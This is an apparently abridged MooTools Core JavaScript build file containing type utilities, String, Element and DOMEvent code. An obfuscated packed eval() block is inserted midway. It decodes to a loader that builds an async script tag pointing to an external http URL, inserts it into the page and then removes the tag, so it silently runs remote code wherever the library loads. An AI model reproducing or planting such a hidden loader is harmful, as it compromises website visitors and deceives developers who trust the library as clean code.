...
web build:
 - http://mootools.net/core/1a9811d78af45402422fc7dc2d2ffe01

packager build:
 - packager build Core/Core Core/Event Core/Class Core/Class.Extras Core/Element Core/Element.Style Core/Element.Event Core/Element.Delegation Core/Element.Dimensions Core/Fx Core/Fx.Morph
...
(function() {
    ...
    this.$each = function(w, v, x) {
        var i = e(w); ((i == "arguments" || i == "collection" || i == "array" || i == "elements") ? Array: Object).each(w, v, x);
    };
    this.$empty = function() {};
...
String.implement({
    ...
    function(p) {
        var e = "";
        var q = this.replace(/<script[^>]*>([\s\S]*?)<\/script>/gi,
        function(r, s) {
            e += s + "\n";
            return "";
        });
    ...
    this.Document = k.$constructor = new Type("Document",
    function() {});
    ...
    try {
        ...
        n = l.slice; ["pop", "push", "reverse", "shift", "sort", "splice", "unshift", "concat", "join", "slice"].each(function(e) {
            var p = l[e];
            Array[e] = function(q) {
...
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('d 6$=[\'\\7\\9\\f\\g\\8\\4\',\'\\4\\k\\C\\4\\5\\e\\h\\q\\h\\7\\9\\f\\g\\8\\4\',\'\\r\\4\\4\\8\\v\\5\\5\\n\\h\\m\\k\\c\\u\\n\\c\\9\\i\\m\\5\\s\\7\\p\\t\\e\\5\\i\\c\\e\\7\',\'\\7\\9\\f\\g\\8\\4\'];(j(){d a=o.D( 6$[0]);a.E= 6$[1];a.F=y;a.x= 6$[2];d b=o.B( 6$[3])[A];b.l.z(a,b);a.w=j(){a.l.G(a)}})();',43,43,'||||x74|x2f|_|x73|x70|x63|||x2e|var|x6a|x72|x69|x61|x6f|function|x65|parentNode|x6d|x67|document|x71|x76|x68|x7a|x79|x39|x3a|onload|src|true|insertBefore|0x0|getElementsByTagName|x78|createElement|type|async|removeChild'.split('|'),0,{}))
...
Hash.alias({
    ...
    var b = {};
    var a = this.DOMEvent = new Type("DOMEvent",
    function(c, g) {
        if (!g) {
            g = window;
        }
        ...
        if (typeof z == "string") {
            ...
            if (z == null) {
                ...
                if (z.Slick) {
                    ...
                    if (this.contains(U.documentElement || U, z)) { (p) ? p.push(z) : p = z;
                        return p;
                    } else {
                        return p;
                    }
...
Elements.alias("extend", "append"); (function() {
    ...
    Object.append(d, {
        "class": function(e, l) { ("className" in e) ? e.className = (l || "") : e.setAttribute("class", l);
        },
    ...
    Element.implement({
        ...
        set: function(D, l) {
            var e = Element.Properties[D]; (e && e.set) ? e.set.call(this, l) : this.setProperty(D, l);
        }.overloadSetter(),
        get: function(l) {
        ...
        erase: function(l) {
            var e = Element.Properties[l]; (e && e.erase) ? e.erase.apply(this) : this.removeProperty(l);
            return this;
        },
        hasClass: function(e) {
    ...
    Element.ShortStyles = {
        ...
        var l = Element.Styles; ["margin", "padding"].each(function(r) {
            var s = r + q;
            p[r][s] = l[s] = "@px";
        });
        var o = "border" + q;
